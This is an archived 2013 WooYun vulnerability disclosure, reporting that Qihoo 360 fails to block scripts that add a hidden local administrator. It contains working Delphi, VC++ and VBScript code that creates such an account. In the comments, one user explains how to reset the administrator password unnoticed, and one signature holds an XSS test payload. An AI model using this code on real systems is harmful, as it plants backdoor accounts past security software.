{"id": 11228, "wybug_id": "wooyun-2013-022498", "wybug_title": "绕过360拦截添加用户！", "wybug_corp": "奇虎360", "wybug_author": "小红帽", "wybug_date": "2013-04-25 15:58", "wybug_open_date": "2013-07-24 15:59", "wybug_type": "权限提升", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-06-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-24：\t细节向公众公开  简要描述： 绕过360拦截添加用户！ 详细说明：  delphi: \nvar f:textfile; beginassignfile(f,'x.vbs');rewrite(f);writeln(f,'set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\")');writeln(f,'os=\"WinNT://\"&wsnetwork.ComputerName');writeln(f,'Set ob=GetObject(os)');writeln(f,'Set oe=GetObject(os&\"/Administrators,group\")');writeln(f,'Set od=ob.Create(\"user\",\"test\")');writeln(f,'od.SetPassword \"gaimima\"');writeln(f,'od.SetInfo');writeln(f,'Set of=GetObject(os&\"/test\",user)');writeln(f,'oe.add os&\"/test\" ');closefile(f);//winexec('x.vbs', SW_HIDE);ShellExecute(0,'open','x.vbs',nil,nil,sw_show);application.MessageBox('user:test'+#13#10+'pass:gaimima','提示!',0);deletefile('x.vbs');end;\nVC：\nDWORD dwLevel = 1;\t\tUSER_INFO_1 ui; \t\tDWORD dwError = 0;\t\tUSES_CONVERSION;\t\tLPWSTR name = A2W(m_netuser);\t\tLPWSTR pwd = A2W(m_netpass);\t\tLPWSTR Administrators = A2W(m_admin);\t\tui.usri1_name =(WCHAR * )name;    //这个是要添加的用户名，可以自己改改\t\tui.usri1_password =(WCHAR * )pwd;   //这个是用户密码，也可以自己改改\t\tui.usri1_priv = USER_PRIV_USER; \t\tui.usri1_home_dir = NULL; //本地路劲\t\tui.usri1_comment =L\"系统管理员\";// 描述\t\tui.usri1_flags = UF_SCRIPT; \t\tui.usri1_script_path = NULL; //登陆脚本  \t\tNetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);\t\twchar_t szAccountName[100]={0};\t\twcscpy(szAccountName,ui.usri1_name); \t\tLOCALGROUP_MEMBERS_INFO_3 account;\t\taccount.lgrmi3_domainandname=szAccountName; \t\t//添加到Administrators组    \tNetLocalGroupAddMembers(NULL,Administrators,3,(LPBYTE)&account,1);\t\tSetDlgItemText(IDC_Log,\"添加成功.......\");\n不光360，其他的安全类也拦截不到吧。。貌似mysql。sqlserver的添加用户  也拦截不到   漏洞证明：  \nset wsnetwork=CreateObject(\"WSCRIPT.NETWORK\")'os=\"WinNT://\"&wsnetwork.ComputerName'Set ob=GetObject(os)'Set oe=GetObject(os&\"/Administrators,group\")'Set od=ob.Create(\"user\",\"test\")'od.SetPassword \"gaimima\"'od.SetInfo');Set of=GetObject(os&\"/test\",user)'oe.add os&\"/test\" '\n保存为vbs运行  360无反映\n\n   修复方案：  你们专业的   版权声明：转载请注明来源 小红帽@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2013-04-25 18:14 厂商回复： 感谢反馈，该问题已着手解决。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-25 15:59 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-04-25 16:04 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  要火    \n     2013-04-25 16:14 |    \t\tbaiduge \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 致力于脚本渗透 目前专注XSS)\t\t \n  要火     \n     2013-04-25 16:19 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  要火    \n     2013-04-25 16:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  要火！    \n     2013-04-25 16:29 |    \t\tabcdlzy \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:14        | 好好学习，天天向上。)\t\t \n  要火       这是要刷1WRMB的节奏么    \n     2013-04-25 16:39 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  给钱    \n     2013-04-25 17:04 |    \t\tJune \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:1        | 姐姐妳小时候给猪亲过啊？)\t\t \n  自评：危害等级： 低    估计要鸡肋    \n     2013-04-25 17:07 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  表示绕过360 绕过安全狗 鄙人都有方法。自己研发 木有提交 ~    \n     2013-04-25 18:52 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  添加用户最多的场景应该是服务器，PC应该比较少见    \n     2013-04-25 20:14 |    \t\tDefa \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:13        | <img src=1 onerror=alert(1)>)\t\t \n  mark    \n     2013-04-25 23:55 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  以后遇到360 就不能添加了吧？    \n     2013-04-26 10:18 |    \t\t漏洞不是用来公开的 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 心存迷惑的话谁都会丧失斗志失去力量)\t\t \n  真不明白为什么要报出来，必将被钉到历史的耻辱柱上！    \n     2013-04-26 10:35 |    \t\tby_奇奇 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:7        | 2)\t\t \n  /ad ???    \n     2013-04-26 12:09 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  服务器上.. 提权后是能直接Kill掉360的...    \n     2013-04-26 12:32 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  拦截的参数是 /add /ad之类的参数。 如果我们执行net user administrator wooyun 这个命令 不带/add 参数 他就不会拦截。    \n     2013-05-16 02:07 |    \t\tiiiiiiiii \t\t\t( 普通白帽子  |\t\t\t        Rank:680 漏洞数:89        | )\t\t \n  @Black Angel 不带参数怎么添加用户     \n     2013-05-16 12:24 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  @iiiiiiiii 你可以测试一下。不是添加用户命令 这个net user administrator wooyun 不带/add或者/ad 参数也是一个命令。 是修改administrator这个帐号密码为wooyun 不管是360还是安全狗都不会拦截这个。一次偶然提权中发现的。    \n     2013-05-22 21:19 |    \t\t黑匣子 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:17        | 我是一个有思想的菜鸟！)\t\t \n  @Black Angel 很早就被封了    \n     2013-05-22 22:12 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  @黑匣子 表示头几天提权还遇到了。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}